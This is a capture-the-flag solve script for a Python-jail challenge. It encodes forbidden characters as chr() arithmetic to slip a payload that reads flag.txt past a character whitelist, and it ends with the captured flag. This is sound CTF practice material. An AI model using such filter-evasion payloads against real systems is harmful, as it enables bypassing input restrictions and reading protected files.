from pwn import *

white_list = "\"\'()+./1<>ACDEGHILNPRXacdeghilnprx"

equiv = {
",":"chr(11+11+11+11)",
"*": "chr(11+11+11+(1<<1+1+1)+1)",
"f": "chr((111>>1)+(11<<1+1)+1+1+1)",
"o": "chr(111)",    #+"11+"*9+"1+"*9+"1)",
    "p": "chr(111+1)",
    "q": "chr(111+1+1)",
    "r": "chr(111+1+1+1)",
    "s": "chr(111+1+1+1+1)",
    "t": "chr(111+(11>>1))",
    "u": "chr(111+1+1+1+1+1+1)",
    "v": "chr(111+1+1+1+1+1+1+1)",
    "w": "chr(111+1+1+1+1+1+1+1+1)",
    "x": "chr(111+1+1+1+1+1+1+1+1+1)",
    "y": "chr(111+1+1+1+1+1+1+1+1+1+1)",
    "z": "chr(111+1+1+1+1+1+1+1+1+1+1+1)",
    # You can add more letters as needed
}

max_length = 137

st = "print(open('flag.txt').read())"
command = ''
for i in st:
    if(not(i in white_list)):
        cr = equiv[i]
        command += cr + "+"
    else:
        command += i
print(len(command))
if(len(command) <= 138):
	print(command)
	
"""
Command : 'prin'+chr(111+(11>>1))+"("+chr(111)+'pen("'+chr((111>>1)+(11<<1+1)+1+1+1)+'lag.'+chr(111+(11>>1))+'x'+chr(111+(11>>1))+'").read())'
Flag : AlphaCTF{C0NGR47$_Y0U_3$C4P3D_7H3_PR1$0N}


"""
